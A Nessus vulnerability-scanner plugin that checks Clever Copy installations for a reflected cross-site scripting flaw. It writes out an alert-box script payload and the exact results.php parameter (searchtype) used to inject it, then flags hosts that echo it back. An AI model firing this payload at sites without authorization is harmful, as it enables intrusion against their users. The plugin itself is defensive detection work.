#
# This script was written by Josh Zlatin-Amishav <josh at tkos dot co dot il>
#
# This script is released under the GNU GPLv2
#
# Changes by Tenable:
#   - revised plugin title, added CVE / OSVDB xrefs, added See also, lowered Risk from Medium (12/11/08)
#   - changed exploit from SQL injection to XSS, which is what these BIDs cover (12/11/08)
#   - revised plugin title, changed family (4/28/09)


include("compat.inc");

if(description)
{
 script_id(19392);
 script_version ("$Revision: 1.14 $");

 script_cve_id("CVE-2005-2324", "CVE-2005-2325", "CVE-2005-2326");
 script_bugtraq_id(14278, 14395, 14397);
 script_xref(name:"OSVDB", value:"17919");
 script_xref(name:"OSVDB", value:"18349");
 script_xref(name:"OSVDB", value:"18350");
 script_xref(name:"OSVDB", value:"18351");
 script_xref(name:"OSVDB", value:"18352");
 script_xref(name:"OSVDB", value:"18353");
 script_xref(name:"OSVDB", value:"18354");
 script_xref(name:"OSVDB", value:"18355");
 script_xref(name:"OSVDB", value:"18356");
 script_xref(name:"OSVDB", value:"18357");
 script_xref(name:"OSVDB", value:"18358");
 script_xref(name:"OSVDB", value:"18359");
 script_xref(name:"OSVDB", value:"18360");
 script_xref(name:"OSVDB", value:"18361");
 script_xref(name:"OSVDB", value:"18509");

 script_name(english:"Clever Copy Multiple Vulnerabilities (XSS, Path Disc, Inf Disc)");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Clever Copy, a free, fully-scalable web
site portal and news posting system written in PHP

The remote version of this software contains multiple vulnerabilities
that can lead to path disclosure, cross-site scripting and
unauthorized access to private messages." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2de3c207" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6452dc3e" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6f8cfd3f" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Checks for XSS in results.php");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"Copyright (C) 2005-2009 Josh Zlatin-Amishav");
 script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

# nb: avoid false-positives caused by not checking for the app itself.
if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);
if ( get_kb_item("www/"+port+"/generic_xss") ) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
 req = http_get(
   item:string(
     dir, "/results.php?",
     'searchtype=">', exss, "category&",
     "searchterm=Nessus"
   ), 
   port:port
 );
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

 if ( xss >< res )
 {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
 }
}
